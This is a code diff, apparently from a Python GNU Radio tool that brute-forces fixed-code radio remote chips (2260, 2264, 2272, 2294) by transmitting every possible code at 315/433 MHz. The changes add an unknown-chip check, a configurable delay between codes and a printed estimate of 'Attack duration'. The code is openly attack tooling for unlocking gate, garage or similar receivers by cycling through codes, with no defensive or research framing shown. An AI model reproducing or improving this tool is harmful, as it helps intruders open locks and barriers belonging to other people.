@@ -175,16 +175,19 @@ def chip2bits(chip):
         n = 20
         encoding = {1: "1110", 0: "1000", "preamble": '10000000000000000000000000000000'}
         dictionary = {"n": n, "encoding": encoding,"t":2}
-    if chip in ["2264", "2272", "2294"]:
+    elif chip in ["2264", "2272", "2294"]:
         print("-> The chip is a fixed code chip")
         n = 12
         encoding = {1: "11101110", 0: "10001000", "f":"10001110","preamble": '10000000000000000000000000000000'}
         dictionary = {"n": n, "encoding": encoding,"t":3}
-    if chip in ["2260"]:
+    elif chip in ["2260"]:
         print("->The chip is a fixed code chip")
         n = 10
         encoding = {1: "11101110", 0: "10001000", "f":"10001110","preamble": '10000000000000000000000000000000'}
         dictionary = {"n": n, "encoding": encoding,"t":2}
+    else:
+        print("Chip isnt in the database!!")
+        exit()
     return dictionary
 
 def main(top_block_cls=generatesignalunlock1, options=None):
@@ -196,11 +199,12 @@ def main(top_block_cls=generatesignalunlock1, options=None):
     print(f"-> The chip {chip} has "+str(dictionary["n"])+" bits of code, therefore there are "+str(total)+" possibles codes")
     number_start = int(input(f"--> Enter the number to start brute force, between {0}-{total}: "))
     number_finish = int(input(f"--> Enter the number to finish brute force, between {0}-{total}: "))
+    delay = int(input("--> Enter the time between each code in miliseconds (e.g., 60/50/30): "))
+    print("Attack duration: "+str((number_finish-number_start)*(delay/1000))+" seconds and "+str(((number_finish-number_start)*(delay/1000))/3600)+" horas")#Transform ms to seconds and multiply by n times
     freq = int(input("--> Enter the frequency Tx in MHz (e.g., 315/370/433): ")+"000000")
-    time = int(input("--> Enter the time between each code in miliseconds (e.g., 60/50/30): "))
 
     qapp = Qt.QApplication(sys.argv)
-    tb = top_block_cls(number_start,number_finish,freq,dictionary,time)
+    tb = top_block_cls(number_start,number_finish,freq,dictionary,delay)
 
     tb.start()
     tb.show()
